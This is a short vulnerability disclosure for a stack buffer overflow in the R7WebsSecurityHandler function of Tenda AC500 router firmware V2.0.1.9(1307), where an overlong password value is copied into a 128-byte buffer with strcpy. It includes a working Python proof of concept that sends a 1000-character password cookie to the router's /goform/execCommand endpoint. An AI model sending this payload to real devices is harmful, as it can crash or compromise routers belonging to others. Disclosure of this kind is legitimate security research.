## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2470.html

## Affected version

AC500 V2.0.1.9(1307)

## Vulnerability details

The Tenda AC500 V2.0.1.9(1307) firmware has a stack overflow vulnerability in the `R7WebsSecurityHandler` function. The `src` variable receives the `password` parameter from a POST request and is later assigned to the `v19` variable, which is fixed at 128 bytes. However, since the user can control the input of `password`, the statement `strcpy(v19, src);` can cause a buffer overflow. The user-provided  `password` can exceed the capacity of the `v19` array, triggering this security vulnerability.

![image-20240319133933045](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319133933045.png)

![image-20240319133855725](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319133855725.png)

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://%s/goform/execCommand"%ip
cookie = {"Cookie":"password=" + "A"*1000}
ret = requests.get(url=url,cookies=cookie)
print(ret.text)
```

![](https://github.com/abcdefg-png/images2/blob/main/image-20240410100105349.png)
